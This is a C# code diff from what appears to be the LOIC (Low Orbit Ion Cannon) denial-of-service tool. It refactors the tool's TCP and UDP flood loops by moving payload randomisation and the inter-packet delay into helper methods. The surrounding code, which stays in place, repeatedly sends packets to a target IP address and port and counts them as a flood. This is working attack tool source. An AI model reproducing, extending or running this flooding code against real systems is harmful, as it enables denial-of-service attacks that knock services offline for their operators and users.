@@ -38,15 +38,7 @@ namespace LOIC
 		{
 			try
 			{
-			    string bufferContents;
-				if (random)
-				{
-					bufferContents = String.Format(Data, Functions.RandomString());
-				}
-				else
-				{
-                    bufferContents = Data;
-				}
+			    string bufferContents = RandomiseData();
 
                 byte[] buf = Encoding.ASCII.GetBytes(bufferContents);
 				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
@@ -72,7 +64,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.Send(buf);
-								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+								SleepDelay();
 							}
 						}
 						catch { }
@@ -87,7 +79,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.SendTo(buf, SocketFlags.None, RHost);
-								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
+                                SleepDelay();
 							}
 						}
 						catch { }
@@ -96,5 +88,23 @@ namespace LOIC
 			}
 			catch { }
 		}
+
+	    private string RandomiseData()
+	    {
+	        if (random)
+	        {
+	            return String.Format(Data, Functions.RandomString());
+	        }
+
+            return Data;
+	    }
+
+	    private void SleepDelay()
+	    {
+	        if (Delay >= 0)
+	        {
+	            System.Threading.Thread.Sleep(Delay+1);
+	        }
+	    }
 	}
 }
